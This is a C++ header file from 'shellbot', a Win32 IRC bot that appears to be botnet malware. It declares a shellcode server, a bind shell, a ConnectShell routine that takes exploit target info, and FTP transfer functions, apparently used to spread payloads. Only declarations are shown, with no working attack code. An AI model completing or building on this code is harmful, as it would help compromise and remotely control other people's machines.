/*	shellbot - a high performance IRC bot for Win32
	Copyright (C) 2005 Shellz

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#ifndef CSHELLCODE_H
#define CSHELLCODE_H

#include "vInclude.h"
#include "CThread.h"

typedef struct FTP 
{
	SOCKET sock;
	char filename[MAX_PATH];
	char requestname[MAX_PATH];
	int threadnum;
	int threads;
	int port;
	char chan[128];
	BOOL notice;
	BOOL silent;
/*	BOOL verbose;
	BOOL gotinfo;*/
} FTP;

int FTP_Data_Connect(char *ip,int port,char *err,char *target,BOOL silent,SOCKET &data_sock);
int FTP_Data_Transfer(SOCKET data_sock);

class CShellcode : public CThread {
public:
	static CShellcode main;
	virtual void *Run();
	void Init();

	static void shellcode_server();
	
	static int FTP_Data_Transfer(SOCKET data_sock);
	static int FTP_Data_Connect(char *ip,int port,char *err,
		char *target,BOOL silent,SOCKET &data_sock);


	bool PrivateIP(const char *ip);
	bool ConnectShell(TargetInfo exinfo, unsigned int connectport);
	int getPort();

	bool bRunning;
	unsigned short bindport;
	const char *bindshell;
	int bindshellsize;

private:
	FTP ftp;
};

#endif